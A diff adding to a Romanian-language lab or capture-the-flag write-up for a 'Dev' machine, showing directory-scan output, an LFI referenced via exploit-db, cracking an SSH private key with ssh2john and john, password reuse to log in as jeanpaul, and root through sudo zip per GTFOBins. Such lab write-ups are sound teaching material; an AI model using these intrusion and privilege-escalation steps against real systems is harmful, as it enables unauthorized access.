@@ -86,9 +86,72 @@ java101          (save.zip)
 - Keep coding in Java because it's awesome
 jp
 ```
+Aici avem și fișierul `id_rsa` pentru connectarea la distănță fără a știe parola:
+### Serviciul HTTP
+Să verificăm ce directoare sunt ascunse pe paginele noastre web primul este portul 8080:
+```
+[19:32:06] Starting:                                                                                                                                                       
+[19:32:08] 403 -  281B  - /.htaccess.bak1                                   
+[19:32:08] 403 -  281B  - /.htaccess.orig                                   
+[19:32:08] 403 -  281B  - /.ht_wsr.txt
+[19:32:08] 403 -  281B  - /.htaccess.save                                   
+[19:32:08] 403 -  281B  - /.htaccess_extra
+[19:32:08] 403 -  281B  - /.htaccess_orig
+[19:32:08] 403 -  281B  - /.htaccess_sc                                     
+[19:32:08] 403 -  281B  - /.htaccessOLD2                                    
+[19:32:08] 403 -  281B  - /.htm                                             
+[19:32:08] 403 -  281B  - /.htaccessOLD
+[19:32:08] 403 -  281B  - /.htpasswds                                       
+[19:32:08] 403 -  281B  - /.htaccess.sample
+[19:32:08] 403 -  281B  - /.htaccessBAK
+[19:32:08] 403 -  281B  - /.htpasswd_test                                   
+[19:32:08] 403 -  281B  - /.httr-oauth                                      
+[19:32:08] 403 -  281B  - /.html                                            
+[19:32:08] 403 -  281B  - /.php                                             
+[19:32:17] 301 -  321B  - /dev  ->  http://192.168.64.138:8080/dev/         
+[19:32:18] 200 -    2KB - /dev/                                             
+[19:32:32] 403 -  281B  - /server-status                                    
+[19:32:32] 403 -  281B  - /server-status/  
+```
+Directoriul care ascuns este `/dev` să verificăm ce ascunde acesta:
+```
+[19:34:26] 301 -  328B  - /dev/config  ->  http://192.168.64.138:8080/dev/config/
+[19:34:26] 200 -  411B  - /dev/config/                                      
+[19:34:28] 200 -    1KB - /dev/favicon.ico                                  
+[19:34:28] 301 -  327B  - /dev/files  ->  http://192.168.64.138:8080/dev/files/
+[19:34:28] 200 -  411B  - /dev/files/                                       
+[19:34:28] 301 -  327B  - /dev/forms  ->  http://192.168.64.138:8080/dev/forms/
+[19:34:32] 301 -  327B  - /dev/pages  ->  http://192.168.64.138:8080/dev/pages/
+[19:34:32] 200 -  530B  - /dev/pages/ 
+```
+Un directoriul care captează interesul este `/pages/` unde sunt salvate credințialile pentru `admin` acum trebuie să ne logăm ca acest user:
 
-
-# HZ CE MAI DEPARTE
 ![alt text](image/Dev_admin_password.png)
 
+De fapt aici este o vulnerabilitate de tip LFI care ne permite să citim fișierile care sunt pe mașina. Acest lucru ne permite să vedem ce utilizatori sunt înregistrați. Instrucțiunea este mai jos:
+https://www.exploit-db.com/exploits/48411
+
 ![alt text](image/Dev_get_correct_user.png)
+
+Utilizatorul care este înteresant poate fii `jeanpaul` să verificăm daca putem să ne logom cum cheile private:
+```
+ssh -i id_rsa jeanpaul@192.168.64.138
+Enter passphrase for key 'id_rsa': 
+jeanpaul@192.168.64.138's password: 
+```
+Avem nevoie de password pentru a ne loga dar în ajutor vine același `ssh2john` care transformă cheile private în hash(de fapt acest lucru este de presos):
+```
+ssh2john id_rsa > id_rsa.hash
+```
+```
+john id_rsa.hash
+```
+Nici un rezultat dar ne aducem aminte de credințialele care au mai fost utilizate anterior și încercăm `I_love_java` și avem succes, acces pe mașină:
+![alt text](image/Dev_get_user.png)
+
+Cu comanda `sudo -l` vedem că avem aces să rulăm comanda `zip` cu privilegi de root în ajutor vine `gtfobins` cu instrucțiunea de mai jos:
+https://gtfobins.github.io/gtfobins/zip/#sudo
+
+![alt text](image.png)
+
+Am primit root :)
